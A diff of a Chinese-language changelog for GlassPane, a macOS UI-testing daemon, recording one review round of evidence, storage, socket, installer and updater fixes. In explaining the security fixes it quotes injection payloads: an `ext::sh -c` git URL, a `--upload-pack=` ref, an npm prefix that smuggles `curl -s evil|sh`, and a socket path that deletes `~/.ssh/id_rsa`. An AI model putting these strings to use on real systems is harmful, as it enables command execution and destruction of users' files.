@@ -2,62 +2,287 @@
 
 本文件记录 GlassPane 的值得注意的变更。格式遵循 Keep a Changelog，版本号遵循 Semantic Versioning，条目按时间倒序。
 
-## [Unreleased]
+## [Unreleased] — 2026-10-09 每日审查（**版本号故意不写**）
 
-- **`glasspaned --version`（下一版按 minor 记，因为 CLI 参数动了）。** 更新器把"本机装的是什么版本"
-  交代成两条读数必须一致：bundle 的 `CFBundleShortVersionString` 与 `glasspaned --version`
-  （`updater/lib/version.js` 的表头就这么写的）。1.9.0 及以前**后一条腿在真机上从来是空的**——
-  `grep '"--version"' engine/Sources` 零命中，真二进制回的是 `unknown argument` + usage + 退出码 64；
-  而套件一直绿，因为 `updater/test/helpers.mjs` 的那个桩**对任何参数都 echo 版本号**，替一个不存在的
-  开关作了背书（桩里跑过的守卫等于没验）。本版起：daemon 的 `--version` 打印 `hello` 里同一个字面量
-  并退 0，且不碰状态根；那份字面量收成单一无出处的 `EngineCore.buildVersion`（`hello`、`--version`
-  与位点表都读它，两处抄写从此没法各说各话）；测试桩改成与真解析器一致（只认 `--version`，其余按
-  `unknown argument` + 64 拒绝）；`updater/lib/selfcheck.js` 两种形状都认得，并有一条用例专门钉住
-  "那一行搬家了"不许成为拒掉一份正常暂存树的理由——那是这个工具自己掐自己的升级路径。
-  新增闸：`DaemonVersionFlagTests`（真起一次 debug 二进制核那两句话、并核解析表与 usage 互逆）、
-  `selfcheck.test.mjs` 的形状对照（旧形状、新形状、两种都没有必须把两处都点名）。
-- **文档补记（在 `v1.9.0` 打 tag 之后落到 main，因此 1.9.0 的发布归档里还是旧文）。**
-  SECURITY 双语 §2.4 之前只列了 `installer-daemon.log` 这一份 launchd 写的日志，本版把
-  `~/.glasspane/update.log` 也纳进了"什么在盘上"的清单与收紧交代，并写明 `0644` 那个数字是从它
-  那位兄弟的实测搬过来的、这一轮没有对真机 launchd 作业重测。代码侧的措施（`AGENT_LOG_NAME` →
-  `StateRoot.updateLogFile` → 注册前 0600）确实随 1.9.0 发出，缺的只是这份文档的同步。
+本轮（2026-10-09 定时任务）的代码审查、安全审查、UX/功能缺口分析与修复全部记在这里。**没有给它取
+版本号，也没有发版**：开工实测 tag / npm 两包 / 仓库版本线都是 1.9.0；运行期间另一路并行任务把
+`v1.10.0` 打出去、两个 npm 包也升到 1.10.0，其中至少四笔与本轮的**同一处缺陷**各自写了一遍——
+`4e18bc8`（签名在而验不过不再"继续安装"＝本轮安装器第 2 条，同改 `installer/cli.js`）、
+`95f0007`（证据包临时名不再共用＝本轮存储第 2 条，同改 `EvidenceStore.swift`）、
+`2b7fae5`（面板结论必须有读者、重启结论只能由实测点亮＝本轮面板第 6/9 条，同改
+`ConsoleModel/SettingsModel/SettingsPanelView/ProjectsTabView`）、`3eac88a`（`sun_path` 容量判定＝
+本轮 socket 那批的邻处，同改 `SocketServer/ProbeSocketServer/DaemonProbe`）。两侧从未在一起跑过
+门禁：把本树并进已发布线上再打 tag，等于发一份**没有被联合验证过**的字节。这一步连同取号一起
+留给用户裁决。
 
-- ⚠ 同批两处由复审（对已合并 diff 的 fresh-eyes 一遍）抓出来的：
-  - `selfcheck.js` 先认两种字面量形状时用的是一个"两种都匹配"的正则，于是**读哪个由行序决定**：
-    一份两份都在的树会读到实例那一份。改成先找权威出处 `public static let buildVersion`，
-    找不到才回落 `public let version`。测试补一份"两份都在、instance 排前面"的树，
-    读回 1.10.0 才算过。
-  - `ProjectRegistry.removalVerdict` 在**文件整个不见**时回 `(answerable: true, removed: true)`：
-    `load()` 把缺文件当成"还没注册"，那对读侧对，对写后回读是同一种撒谎的另一张脸（一次没落盘的写
-    与一张被删掉的表都给出一样的形状），于是命令报"确认已删除"并退 0。现在缺文件与读不开走同一条
-    不回答的路，CLI 回 exit 1 + `loadFailed`。用例：`testRemovalVerdictRefusesWhenTheFileIsGoneAfterTheWrite`。
-- 另有一条复审指控被实测**推翻**：`glasspaned --state-dir relative/path --version` 并不会像它说的
-  退 0——`--state-dir` 的绝对路径校验发生在解析循环里，两种参数顺序实测都退 64。记录在此，
+取号时的判据（在本分支的树上实测）：状态文件字段未动；daemon 退出码集合仍是 `{0,1,2,3,64,65}`
+（`grep -oE "exit\([0-9]+\)"` 实测六个，新增拒绝都落在已有的 1 与 64 上）；两个 npm 包的 `bin`
+未动（`glasspane-mcp`→`dist/index.js`+`dist/http-gateway-cli.js`，`glasspane-install`→`./cli.js`）；
+**动的是对外可见的契约内容**——`--socket-path` / `--probe-socket-path` 新增相对路径拒绝与非 socket
+名字硬拒，面板新增一个存活三态与第三种措辞，`--evidence-stats` 的 `listFailure` 有了读者，MCP 壳把
+`attach.bundleId` / `observe.role` 的上界由 256/128 对齐到 daemon 自己的 512。按 1.6.2 写下、1.9.0
+沿用的口径（动契约就不塞 patch），**应记 minor**。
+
+面 A 基线本轮**没有** `--record`：实测 `mcp-shell/src` 由金样的 8,658 LOC 涨到 8,847（+189，
+全部是本轮有意改动），`node harness/tools/tool-surface.mjs --check` 因此转红。这属于本轮自己的
+增长、本该同批补记，但本轮不发版、且上游那笔并行改动同样在动这个面，此时 `--record` 会把两条线
+的计数混进同一份金样——留给发版那一步与用户裁决一起处理。
+
+### Fixed — 证据语义：测不到的地方不许替它答
+
+- **退化趋势的斜率一直是舍入噪声，不是测量**（P0）。`DegradationSignal.slope` 用原始 epoch 秒做
+  `n*Σxy − Σx*Σy`：自变量在 1.8e9 量级，`Σx²` 到 2e20，分母是两个 2e20 相减留下的约 5e3，
+  消去之后只剩浮点舍入的残渣。把这文件自己的算式在 400 组随机真 epoch 上跑一遍：真实 +500 B/s 的
+  泄漏，旧式**400 组全部**测不出 ±5% 以内的数（其中 100 组直接判"不足统计"），噪声也能被测成大正数。
+  而这根斜率的符号就是 T9 熔断档位的输入——一档判反，证据里就是一次不存在的泄漏或一次被放过的真泄漏。
+  现在先减均值再累加，分子分母都回到小量级。闸：`ReviewCoreATests.testSlopeOfAFiveHundredBytePerSecondLeakSurvivesEpochTimestamps`
+  （撤掉修复必红，按上面那组数字）+ 抖动对照 + 单点/零跨度仍拒。
+- **窗口在两次采集之间被拖走时，那个像素比说的是两块屏幕**（P0）。`windowId` 相同只证明"截的还是
+  那个窗口"，不证明"截的是同一块区域"：`WindowCapture.bounds` 每次各自解析，尺寸没动、位置动了
+  （SCKCapturer 按当帧的 frame 裁屏）时，before/after 是两块区域的裁剪，逐像素比照样给一个 0...1
+  的数，并作为 `signals.pixelDiff` 发布"界面变没变"。现在两帧边界必须逐边对齐到半磅内，否则
+  `pixelDiff = nil` 并给出新成因标签 `pixel-capture-window-moved`（`Classifier` 那张成因表也认得它）。
+  闸：`ReviewCoreBTests.testWindowMovedBetweenCapturesIsNotPublishedAsAPixelMeasurement`。
+- **事件 tap 的活性从前等于"句柄不是 nil"**（P0）。`CGEvent.tapCreate` 成功返回一个**从未启用**的 tap
+  是文档化的结果（目标崩了、被别的探针抢占、席位状态不对），而系统在建tap 时禁用它不会补发 disable
+  回调——于是 `AttributionGuard` 拿着 `monitored: true, contaminated: false` 给一次没人监听过的
+  操作签了"无污染"。现在活性只认 `CGEvent.tapIsEnabled` 的回读，且每次 pump 再读一次，断掉的
+  那个 tick 不再被当成"这一轮没有人工输入"。闸：`ReviewCoreATests.testTapLivenessIsAssignedFromTheEnabledReadBackNotFromTheHandle`
+  ——**这是形状闸**：装一个真的 session-level tap 会吃掉这台机器的键盘，读取本身无法在门禁里跑。
+- **遮挡读不出边界时不许当"没遮挡"**。`SCKCapturer` 的邻居循环从前把解析不出边界的窗口折成
+  `CGRect(0,0,0,0)`：空矩形永不相交，于是真实遮挡者从 `occludedBy` 里消失，而被 R6-11 判过谎的
+  显示区域裁剪又活了；目标窗口压根不在 CG 列表里时，每一个窗口都被算成遮挡它。现在不可数的邻居
+  不进名单、目标在场与否单独记，两种数不出都拒答而不是给一个"空列表"。
+- **ping 超时不许把预算写成回答时间**（`pingMs = 2000` 是分类器打印的"这个 app 答了多久"，而它
+  压根没答）：改记实测经过时间，并把预算留在成因文本里。闸
+  `testPingTimeoutReportsMeasuredElapsedRatherThanTheBudgetConstant`。
+- **两处"一个标签下两件事实"**：角色过滤后的 observe 从前在摘要算不出来时借用**未过滤**那棵树的
+  摘要（`digest` 与 `nodeCount`/`axTree` 从此描述两棵树）——改为如实抛出；`gp_restore` 的回显把
+  选择器里**没给**的 `title`/`identifier` 写成空串（空串读起来像"断言它等于空"）——改为缺席。
+- **只比对不回滚的那条路在不可抵赖的链上写的是 `restore executed: compare`**：同段兄弟路径都写
+  "planned only"/"failed at step N"，只有它用了 executed 字样。改成
+  `restore compared only, no step rolled back: compare`，并有一条断言禁止 executed 再现。
+- **熔断原因不再整句消失**：`pixelDiff == nil` 那条从前还要 `treeBefore != nil` 才成立，于是树**也**
+  失败时只剩 `ax-tree-capture-failed`，像素通道的名字（席位被拒/超时/取不到图）蒸发；性能升级那句
+  从前把带实测 `NNNNms > 10000ms` 的整句换成裸前缀 `performance|`。两处都改成"各自说各自的"。
+- 一条审查指控被**规格推翻并已撤回**：说"`axChanged == false` 且无像素测量时判 T3 是替未测量作答，
+  应改判 INCONCLUSIVE"。实测 `specs/GlassPane_P0_实施规格_v1.0.md:294` 与
+  `..._P1_实施规格_v1.0_SCK迁移.md:80` 写的都是"屏幕录制权限拒绝 → pixelDiff=null：T3 判定仍可用
+  （树+操作确认），T6 退化 INCONCLUSIVE"，而 `specs/GlassPane_Audit_2026-09-22_全量审查与UI迭代.md`
+  的 A-7 处理过同一处、结论是"改文案、归类保持保守不变"。诚实由措辞保证：`pixelClause` 在无测量时
+  说 "pixels not measured"。这条现在由
+  `ReviewFixes20261009Tests.testDeadClickStaysDecidableWithoutPixelsButMustSaySo` 钉住，
   免得下一轮把同一条指控再当缺陷报一次。
 
-- **首帧的像素格式从"假设默认值是 BGRA"改成显式声明 + 逐帧核对。** 这是把 macOS 13 那条流
-  通路修好之后**才出现的**新风险：登记了帧输出，这条路第一次真的会收到缓冲，而下面的拷贝按
-  单平面 BGRA 写、`SCStreamConfiguration.pixelFormat` 从来没被设置过（全仓 `grep pixelFormat`
-  零命中）。默认值若不是 BGRA，抄出来是一张绿色/噪声图，带着一个看似真实的像素差进证据包——
-  比修复前更坏，因为修复前至少是如实的"测不到"。现在三态分开说：没等到（才是超时）/
-  格式不是这条路能转的（给出可查的 fourCC）/ 转不出来。同批把 `waitForFirstFrame` 的
-  `nil` 一途拆掉，"等到了但转不出来"从此不再冒充计时抖动。
-- **网关关停改为有顶，并删掉一条跑不到的"旧 Node 回落"。** `closeIdleConnections` 与
-  `closeAllConnections` 都出自 Node v18.2.0，本包声明 `engines: >=18`，"只有其中一个"的运行时
-  不存在——那条分支唯一会做的事就是把刚修好的在飞 `act` 再拆一次。真正的洞是另一边：一个永不
-  变空闲的连接会让 `close()` 永远不落地，SIGTERM 后进程挂死。现在到
-  `CALLER_VISIBLE_CEILING_MS`（50s，那一刻调用方早就收到 `GP_E_ENGINE_TIMEOUT` + "别重发"）
-  仍关不掉，就先说一句"放弃了什么"再强拆。
-- **两处我自己写的闸/报文被复审抓出来**：`--list-projects` 的拒绝报文里留着
-  `"projects": []` 与 `"count": 0`（正是要消灭的那两个键）；`RegistryVerdictTests` 那条
-  `exit(1)` 断言的切片一直切到文件尾，被后面八条别的 `exit(1)` 满足——"把拒绝改回 exit(0)"
-  照样绿。两处都改成有界窗口 + 反向验红。
-- **假 daemon 的拒绝也被钉住了。** 上一笔把 `makeDaemonBinary` 改成只认 `--version`，但没人
-  钉住这个拒绝：它退化回有求必应，上面那批用例照样绿。现在三种非 `--version` 参数各自要求
-  退出码 64、stdout 空、stderr 说 `unknown argument`。
+### Fixed — 存储与协议：读不出不是"没有"
 
-这四条与上面 `--version` 那一批同属"下一版带上"。面 A 因关停/格式那两笔再长 +6 LOC
-（8652 → 8658），同批 `--record`。
+- **一份读不开的审批台账会被下一次追加整个抹掉，而校验还说 valid**（P0）。`ApprovalGate.init`
+  在文件存在但解不开时置 `loadFailed` 并以空链起步；`append` 从不看这个旗，于是新记录的 `prevHash`
+  从 genesis 重新锚定（`""`），`persist()` 再把整份文件换成这一条记录——盘上所有历史批准被删除，
+  而 `--approval-verify` 读到的正是一条自洽的链，报 `valid: true`。这是审计链的数据丢失加假清白，
+  而 `ProjectRegistry.requireWritable()` 对同一种状况是拒写的。现在 `loadFailed` 时拒追加、
+  一个字节都不碰那个文件、把原因与出路（点名台账文件、`--approval-audit` 读的就是同一个名字）留在
+  `persistFailed` 里；文件缺失（`loadFailed == false`）仍照常建档——那条路本来就是新机器。
+  闸：`testCorruptLedgerRefusesAppendAndLeavesTheFileUntouched`（逐字节回读比对）+
+  `testHealthyLedgerStillAppends` 作对照。
+- **归档列目录失败被写成"档案是空的"**（P1）。`LocalArchive` 的扫描在目录存在但列不出时回
+  `summaries: []、directoryExists: true`，正是 `EvidenceStore.archiveListing` 存在的理由。
+  现在扫描带 `listFailure: String?`，daemon 的 `--prune-evidence` / `--evidence-stats` 把它交出去，
+  面板据此进 `.failed` 而不是 `.empty`。
+- **规范化 JSON 在两种语言里给出两种字节**（P1）。`CanonicalJSON` 对 NaN/±Infinity 走
+  `String(describing:)` 打出 `nan`/`inf`（非法 JSON），而 TS 侧 `JSON.stringify` 给 `null`；
+  ≥2^53 的整数值 Swift 打成 `9e+15` 形态、JS 打成固定记法——`treeDigest` 两侧都算它，同一棵树
+  于是有两个摘要。现在非有限值回 `null`、整数值按 `JSON.stringify` 的边界用固定记法。
+- **注册表的两条腿不再各说各话**：磁盘上那个名字不是 0600 时从前"写成功但如实降级"，而写侧的硬闸
+  只看内存字段——现在 load 记实测模式、publish 前重新 lstat，盘上松了照样拒（模式只作拒写理由，
+  绝不进 `projects.json`）；三份写路径的临时名改为 `pid + uuid` 唯一（固定的 `<file>.tmp` 允许一个
+  同用户进程预置内容、被 daemon 收成 0600 再 rename 进审计链）。
+- probe 帧里的 `pid` 从前 `intValue > 0` 后取 `.int32Value`：4294967297 截成 1——现在按 int32 区间
+  拒；配方文件（克隆仓库即可控）里的值不再无限原样回显进错误；Crockford/`op_`+26 那套字面量从
+  四处抄写收归 `OperationID` 派生；`DaemonProbe` 的默认 socket 路径不再自算第二份家目录口径。
+
+### Fixed — socket 名字与命令行：拒绝删除不是 socket 的 inode
+
+- **`glasspaned --socket-path ~/.ssh/id_rsa` 会删掉那个文件**（P0）。`--socket-path` /
+  `--probe-socket-path` 接受任意字符串，`SocketServer` 在把名字判成"没有监听者"时无条件 unlink，
+  而"没有监听者"这个分类里包含 **ECONNREFUSED / ENOTSOCK——普通文件正是这么回答 connect 的**。
+  于是残留清理那条路把用户的私钥删了并在原地建 socket；`installer/cli.js` 会把调用方给的
+  `--socket-path` 写进 launchd plist，这条在产线上可达。现在每次接管名字的 unlink 之前先 `lstat`
+  并要求 `S_ISSOCK`：普通文件、目录、符号链接一律硬拒、点名它是什么、且**绝不删除**。
+  `--force-socket` 是"顶掉一个监听者"的意图，不是"删掉这个位置上的任何东西"的意图，这条也单独钉了。
+  闸：`ReviewLifecycleTests` 的 engine/probe 六条（含撤掉守卫即红的字节断言）+ 两条对照
+  （**确认是 socket 的残留照旧清掉并接管**，否则这条闸只是把 bind 关掉）。
+  与被撤回的旧断言同批：`PermissionSubjectTests.testProbeStartClearsDemonstrablyUnownedName`
+  原来钉的正是"普通文件占名→清掉再 bind"，改名并反转为
+  `testProbeStartRefusesToDeleteARegularFileAtItsName`。
+- **相对 `--socket-path` 会把用户文档目录收成 0700**（P1）：`cd ~/Documents && glasspaned
+  --socket-path ./s.sock` 先 chmod 那个目录、随后 bind 失败退 1，模式改动留下了。现在两个 socket
+  开关与 `--state-dir` 共用同一套绝对路径规则（一处判定，三种拼写不可能各说各话）。
+- **探针监听者从前只 mkdir(0700) 就完事**（P1，安全）：既不改已存在目录、不核所有权、不读回模式，
+  也不拒绑——攻击者持有或 0755 的目录能长期供着 `probe.sock`，随时 unlink 再自绑，被测试 app 的探针
+  流经攻击者，而 daemon 一直报"没有探针连接"，归因与检查点回滚静默失效。现在与 engine 侧共用同一条
+  目录收紧闸（实测 0700 不粘就拒绝登记那个名字）。
+- **开关三处清单里 `-v` 是隐形的**（P2）：解析表有 `-v`、usage 与文件头都没有，而那条具名报错的
+  奇偶闸只扫 `--` 前缀，短开关按构造永不参与对照。现在表/usage/头三处各 33 条、零差集，闸自己
+  带自证（单侧缺项必须点名）。
+
+### Fixed — 设置面板：只呈现实测
+
+- **"运行中"从前由文件是否存在决定**（P0）。`reachable` 取的是 `DaemonProbe.reachable`，那函数是
+  `fileExists`；崩掉而留下 socket 文件的 daemon 于是点亮绿点+"运行中"，同时四张权限卡说服务没在跑。
+  现在存活只由 `liveness` 的三态决定，`.answered` 才算运行中，"有人应门但不开口"有自己那句
+  （既不谎报在跑，也不谎报没跑），一次 hello 失败不再被"保留上次的 true"。
+- **五处 nil 折成假值**：自动更新开关在读不出处境时 `?? false` 画成"关"（而同刻开关还可点）；
+  `snapshot == nil` 说成"没有待装版本"（读不到与没有是两件事）；验证失败后徽标仍留着上一次的
+  "可用（实测）"；`daemonBinaryPath` 只在 nil 时赋值，重装/重启后面板继续 exec 退役的那份二进制
+  （清理/删除/校验/统计四条路径都是）；档案卡只在 `.onAppear` 取数，首帧没 hello 就永远卡在
+  "后台服务不可达"，刷新按钮也不再取。另修：读不出的档案把视图卡死在"正在读取"（现走
+  loading/failed/loaded 三态），"重启后台服务"不看 `kickstart` 退出码、`manualRestartHint` 全仓
+  零消费者（现接进失败支且失败时清掉 hello 派生字段），以及禁用理由里那句指向不存在的
+  `updater status` 可执行文件的话。
+- **面板不再写进它管不着的状态根**（P1）：`ConsoleModel` 每条 CLI 调用都按家目录默认根跑，用户用
+  `--state-dir` 挪过根的话，清理按钮会**删另一个根里的真档案**，而文案还说"档案目录：<这个根>"
+  （那里可能压根没有档案目录）。现在每条调用显式点名 `--state-dir`，并写明按的是哪一条规则。
+- `Measured`（"未测量" ≠ "没有"）这个指示器从前零消费者，而本轮一半的面板缺陷就是它的缺失；现在
+  nil 快照、不可达的统计、未测的像素通道三处都在用它。
+
+### Fixed — MCP 壳：一次坏帧不许炸掉别人
+
+- **一条超长回音让所有在飞请求一起死，还被判成 daemon 失联**（P0）。oversize 走 error 通道，
+  `onError` 对任何错误都 forget + `io.close()`；close 触发 `teardown`，把**别的**每个在飞请求都判成
+  `GP_E_ENGINE_UNREACHABLE` 加一条重启命令（那会 SIGTERM 一个正在 `act` 的 daemon），而这条调用自己
+  的文本还写着"连接完好、其他请求不受影响"。现在超长帧只结算它自己那一路，套接字与他人不受牵连
+  （`LineReader` 丢弃到换行后重同步，与 Swift 侧 `FrameCodec.discardUntilNewline` 同规则）。
+  闸 `an oversize daemon reply fails only its own call...` 走的是真 `Duplex` + 生产 `StreamLineIo`，
+  旧代码必红。
+- **无 id 的错误帧从前删掉最早那个在飞条目**（P1）：被误判的调用方可能是一条帧本来解析成功的 `act`，
+  真回音随后到就被判成"客户端没发过的帧"，operationId 永远进不了轨迹。现在与已结算那支同处理：
+  标记 + 保留给迟到回音。
+- **迟到回音不再把 AX 树原样写进 stderr**（P2，安全）：那里面是窗口标题与控件值；现在只记方法、
+  id 与字节数，并保留"这是未脱敏的引擎内容"这句实话。
+- **remedy 不许要求重发有副作用的动作**：轨迹里每个 id 都回 `GP_E_NO_EVIDENCE` 时，壳从前既断言一个
+  它不可能知道的成因（"引擎可能重启过"），又命令"重跑 gp_act"——同函数另一处明令不许这么做。
+  三条"看日志然后重试"也各自改判：按方法是否可安全重放分支，不可重放的只指读侧工具。
+  闸是一张**表**：`table: no shell-fault remedy for a replay-unsafe method orders a re-send`。
+- **契约上界对着 daemon 取齐**（P1）：壳把 `attach.bundleId` 卡在 256、`observe.role` 卡在 128，
+  而 `Dispatcher.swift` 用的是 512——更紧的壳界不是安全余量，它拦下的是 daemon 本来会接受并回答的
+  帧，代理因此拿不到 daemon 自己的判词。现在两处用 `SELECTOR_MAX_LENGTH`/512，并由
+  `consumer-consistency.test.mjs` 直接从 Swift 源码读这两个数字来闸（变异验过：改回 256 即红）。
+  `projectId` 是壳**故意**更严的一处，闸里明写这条不对称而不是抹平它。
+- **经管道时帮助与报错文本被截**（P1）：stdout/stderr 在被 pipe 时是异步的，`process.exit` 紧跟在
+  `write` 之后，读者只剩一个裸退出码；现在同步 fd 写并处理 `EAGAIN`。另修 stdin `"error"` 那条路径
+  绕过写队列直接关停（在途回音被丢）。
+- 工具会话参数不再自带默认（漏传就记进一条私有轨迹，`gp_recent_reports` 答"没记录过任何操作"）；
+  `capture_view` 不再替缺 `mimeType` 的帧编一个 `image/png`；相对 `node updater/cli.js` 这类按未知
+  cwd/PATH 解析的 remedy 改为绝对路径或 `/usr/bin/plutil`、`/bin/cat`。
+- **本仓的探针缺席时面 B 的归属**：`kernel/schemas/**` 里没有任何工具面 schema（只有
+  `decision-log-entry`/`evidence-pack`/`recipe-config`），所谓"三处镜像"在工具面上实测只有两处——
+  记在这里，免得下一轮又按三处去找第三处。
+
+### Fixed — 安装器与更新器：验证过的是哪一份字节
+
+- **"安装完成（退出码 0）"从前不证明本轮产物在跑**（P0）。收尾判据是 `arrived && hello?.version`：
+  一个旧构建的 daemon 只要还在 socket 上应答，版本号就非空、新构建的那个压根没起，安装器照样报成
+  功。现在把**本轮那个二进制**的 `--version`（与 hello 同源的同一条字面量）与 hello 的版本核一次，
+  不一致就是"旧构建还在服务"——红字点名两个版本号、给 `--replace-daemon`、非零退出；读不出该二进制
+  的版本时说的是"这项检查没做成"，不是"检查通过"。桩与真解析器同形（非 `--version` 一律
+  `unknown argument` + 64），有求必应的桩正是这个缺陷此前一路绿的原因。
+- **`GLASSPANE_REPO_URL` 是文档化的覆盖项，直接插进 `git clone`**（P0，安全）：
+  `ext::sh -c evil`（或 `--upload-pack=` 打头的 `GLASSPANE_REF`）在克隆那一刻就执行命令。
+  现在只放 `https://`/`ssh://`/`file://`，以 `-` 打头的值拒，URL 前有 `--`，`install.sh` 与
+  `installer/cli.js` 同一套（`file://` 只为让门禁能真跑一次克隆来证明守卫在起作用；README 里
+  这条口径同步改了，scp 式 `git@host:path` 现被拒）。
+- **BAD 签名不再"继续安装"**（P1）。`status === 'invalid'` 是篡改的正证据，从前黄字一句继续跑
+  `npm install`/`swift build`/`make-app.sh`，而 SECURITY.md §2.8 写的是"发布了却验不过＝硬拒，
+  任何同意都不许越过"。（同一段也如实记下：`git verify-tag` 验的是克隆里那个 ref-tip，
+  不是被钉住的那个 tag 对象——这条限制现在写在拒绝文案里。）
+- **HOME 未设或相对、以及以 root 跑**，从前会让整份安装落进 CWD 或 `/var/root`；现在两条守卫都在
+  任何一次写入之前。收拢旧实例那一步不再把所有 pid 一律报成"已结束"：EPERM 与僵尸各归"我动不了它"，
+  幸存者单独点名并给人能跑的那条命令（从前 `kill -0` 对僵尸回成功，于是把人支去 `sudo kill -9` 一个
+  已经死的 pid）。预检不再把 `/usr/bin/swift`、`/usr/bin/git` 那两个 CLT shim 当"装了"（文件在、
+  一跑就死）；launchd plist 以 0600 落盘并把模式读回来。
+- **`--no-prompt` 从前是个不存在的能力**：`confirm()` 全仓零调用，README 却说它"跳过每步确认"。
+  现在它真有作用——覆盖已有 bundle、bootout 已加载作业、`--replace-daemon` 收拢在跑实例这三处破坏性
+  动作各问一次；非交互又没给旗是**跳过**（绝不默认同意），`install.sh` 在非 TTY 时补上该旗，因此
+  `curl | sh` 与 `npm run install:engine:silent` 的行为不变。
+- **更新器的签名信任锚由它所认证的发布送过来**（P0）。锚是 `installer/cli.js` 里的
+  `GLASSPANE_SIGNING_PUBLIC_KEY`，而 `installer/` 是**从发布归档**复制进运行时的：一次没带可用签名、
+  被人以 `--consent unsigned-release` 放行的发布，就装下了攻击者的钥匙，此后每个攻击者发布都读成
+  `verified`——常驻警告、`--consent` 的拒绝、整道闸 8 一起静默消失。现在 `updater/lib/` 里钉住主钥
+  指纹，导入的钥匙与 `VALIDSIG` 那一项必须都等于它，否则判 `invalid`（不可被同意越过）。
+  这个数不是抄来的：本机用真 gpg 实测——导入 `installer/cli.js` 的钥匙得
+  `0929EA31DF4F7429F63FC53189D88B1D043A1298`，已发布的 `SHA256SUMS-1.9.0.txt.asc` 对它验签回
+  `VALIDSIG` 同一指纹；测试用 gpg 从那块 armored 钥匙**重推**这个常量，两者哪天分家就是一条红。
+  换钥匙＝改这一行并说明理由。
+- **暂存证明不再对着另一份字节发**（P1）：`verifyStagedBytes` 先哈希归档、再读**同一个路径**解出来，
+  随后 build/pack 用的还是先前那棵树——同用户代码可以在哈希时给签名归档、在第二次读之前换掉它。
+  现在一次读入、对同一段字节哈希并解压、交出去的是刚证明过的那棵树；测试注入接缝真的换第二次读，
+  不再只改树（旧套件的正例对这种交换全盲）。
+- **换装不再是 `rmSync` 再 `cpSync`**（P1）：备份与最后盖章之间被杀，`~/Applications/GlassPane.app`
+  就残缺或消失，而 `update-state.json` 还说旧版本装着。现在复制先进 `<name>.new-<pid>` 再同卷
+  `rename`，中途失败原地那份字节完好（用会抛的接缝测）。
+- **`sudo chown -R "$(whoami)" <dir>` 这种 remedy 消失了**（P1，安全）：`<dir>` 直接来自
+  `npm config get prefix`，同用户进程把 `prefix=/tmp/x"; curl -s evil|sh; #` 写进 `~/.npmrc`
+  就拿到一条给人或代理执行的 root 命令。更新器此前所有 remedy 都是**节点自己 spawn argv、从不进
+  shell**，这条是唯一漏出去的一句特权 shell 拼接。现在路径一律引号包好、命令一律不代拼，
+  并把 `lib/` 整片纳入 remedy 扫描。另修：`readDaemonVersion` 从前不看退出码、stdout 里任何
+  `\d+\.\d+\.\d+` 都算"本机版本"（一句 usage banner 里的数字就成了升降级的基线）；
+  `enable --hour 25` 会写出永不触发的 plist 而状态还说"自动更新已开"；登记"验过"从前只要参数里
+  **含有** cli 路径，与另一处严格比对的两个读者对同一个事实能给出相反答案；gzip 解到有界上限、
+  归档成员模式掩掉组/其他可写位、重定向后读不出终点 URL 时改为 fail-closed。
+
+### Fixed — LLDB 桥、CI、文档
+
+- **被调试的进程可以伪造桥的载荷**（P1）：目标 stdout 经 lldb 的 stdout 流回，`extract_sentinel`
+  取**第一个**可解析的哨兵对，所以目标先打印一句 `GPBRIDGE<<{...}>>GPBRIDGE` 就能替换线程/状态与
+  成功判词，或在两对之间打印坏 JSON 让真载荷读成"没有载荷"。现在取最后一个可解析对，并且每次运行
+  带一个不可猜的 nonce。同批：`text=True` 严格解码在非 UTF-8 字节上让桥以 traceback 死掉（违反它自己的
+  "失败也以 JSON 交出"）；`shlex.quote` 是 shell 层引号、那段文本却由 Python 求值，带撇号的 exe 路径
+  每次都SyntaxError；`gp-watch add … x` 这种模式既不读也不写、永不触发却占掉四个硬件槽之一，
+  账上还写着已武装。
+- **CI 两处**：`harness-contract.yml` 的计划通道从前 `|| true` 抹掉退出码、只靠 `grep -q "drift"`
+  判红——probe 崩了没有"drift"于是**绿着放行**一个没人验证过的升级，而干净路径自己打印"no drift"
+  又能假红。现在以退出码为权威（0 完好 / 1 漂移 / 2 测不了），判决按行首行尾锚定，"0 而无判决行"
+  这类形状一律不算通过。`ci.yml` 此前没有顶层 `permissions:`（另两条 workflow 都有），逐 job 核过
+  只需要 `contents: read` 之后补上。
+- **文档与代码对齐**：SECURITY.md 双语 §2.2 曾让读者把 `--replace-daemon` 交给 `glasspaned`——那是
+  安装器的旗，daemon 会回 `unknown argument` + 64，照着这一页办事的代理拿到的是一次拒绝而不是一次
+  接管（P0：文档指示了一条跑不通的命令）；§4 受影响版本表还写着"1.1.x 是当前线"；§2.3 指向 §2.4 说
+  "今天仍存在一个世界可读的文件"，而 §2.4 自己与代码都已收口。README 双语：`install.sh` 钉的 tag
+  写成 v1.1.1（实测当时是 v1.9.0，现随本版更新）；"归因默认 weak"与代码的 `.soft` 相反（weak 是被
+  污染时的判词）；"「安装更新」不授予这一项"与面板实际提供的 `--consent unsigned-release` 那条路相反；
+  "Does anything leave my machine? No." 对照计划更新器的出网 HTTPS 不成立；"macOS 14+"与
+  `Package.swift` 的 `.macOS(.v13)`；CONTRIBUTING 双语说 CI 七条 job，实测九条（缺
+  `harness-rulers` 与 `workflow-lint`）。
+
+### 本版未修（如实记录）
+
+- `release.yml` 的两个发布 job 不跑任何测试：打在一条测试全红的 commit 上，照样 GPG 签名发
+  GitHub Release，dispatch 也照样永久发两个 npm 包（P1）。这是不可逆通道，改动本身也要真机核，
+  本轮**没有**动它——列进待裁决。
+- `engine/scripts/make-app.sh` 只签外层 bundle，`Contents/MacOS/<exe>` 保留 SwiftPM 的 ad-hoc
+  标识；结论需 `codesign -dvvv` 对着运行中的进程看，属**待真机复跑**。
+- bind 与 `shutdownSockets.register` 之间那一步被 SIGTERM 会留下 socket 文件（要改就得在信号路径
+  周围重排 setup 步骤，与本仓已被真机证伪过的那族方案冲突）；本轮按设计**不改**。
+- `--prune-evidence` 在"读不出"与"本来没有"两种情形给出的答案仍同形（同一族的另一处，本轮只修了
+  列目录与写侧）。
+- Actions 仍引用可变 major 标签（`actions/checkout@v4` 等），包括签名与发布那条路径。
+- 面板的清理预览仍读它自己的文件，而不是 daemon 的 `--project-prune` 试算——"按下的删除与确认时
+  看到的不是同一张表"这一族只在文案里交代，没改成试算（架构决策，待裁决）。
+- 公证（Developer ID + notarytool）仍是 owner 未启用的决策，本轮未做也未声称。
+- `iterate.config.yaml` 里记录的 `package.json` 指纹（`958fa100…`）与今天实测值漂移；那是 iterate
+  侧账本，本轮只报不改。
+- SCK 像素通道、四张 TCC 席位、无障碍/事件监听的真实读数：CI 与本机器都造不出登录 GUI 会话，
+  一律**待真机复跑**，不得标"已验证"。
+
